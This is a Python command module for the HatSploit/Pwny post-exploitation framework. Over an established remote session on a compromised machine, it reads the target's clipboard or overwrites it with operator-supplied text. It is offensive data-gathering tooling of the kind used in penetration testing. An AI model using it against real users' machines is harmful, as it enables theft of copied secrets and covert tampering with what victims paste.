"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

CLIPBOARD_BASE = 16

CLIPBOARD_GET = tlv_custom_tag(API_CALL_STATIC, CLIPBOARD_BASE, API_CALL)
CLIPBOARD_SET = tlv_custom_tag(API_CALL_STATIC, CLIPBOARD_BASE, API_CALL + 1)

TLV_TYPE_CLIP_DATA = tlv_custom_type(TLV_TYPE_STRING, CLIPBOARD_BASE, API_TYPE)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "clipboard",
            'Authors': [
                'EntySec - command developer',
            ],
            'Description': "Get or set clipboard contents.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-g', '--get'),
                    {
                        'help': "Get clipboard text.",
                        'action': 'store_true',
                    }
                ),
                (
                    ('-s', '--set'),
                    {
                        'help': "Set clipboard text.",
                        'metavar': 'TEXT',
                    }
                ),
            ]
        })

    def run(self, args):
        if args.get:
            result = self.session.send_command(tag=CLIPBOARD_GET)

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to get clipboard contents!")
                return

            data = result.get_string(TLV_TYPE_CLIP_DATA)
            if data:
                self.print_information(data)
            else:
                self.print_warning("Clipboard is empty.")

        elif args.set:
            result = self.session.send_command(
                tag=CLIPBOARD_SET,
                args={
                    TLV_TYPE_CLIP_DATA: args.set,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to set clipboard contents!")
                return

            self.print_success("Clipboard updated.")

        else:
            self.print_usage()
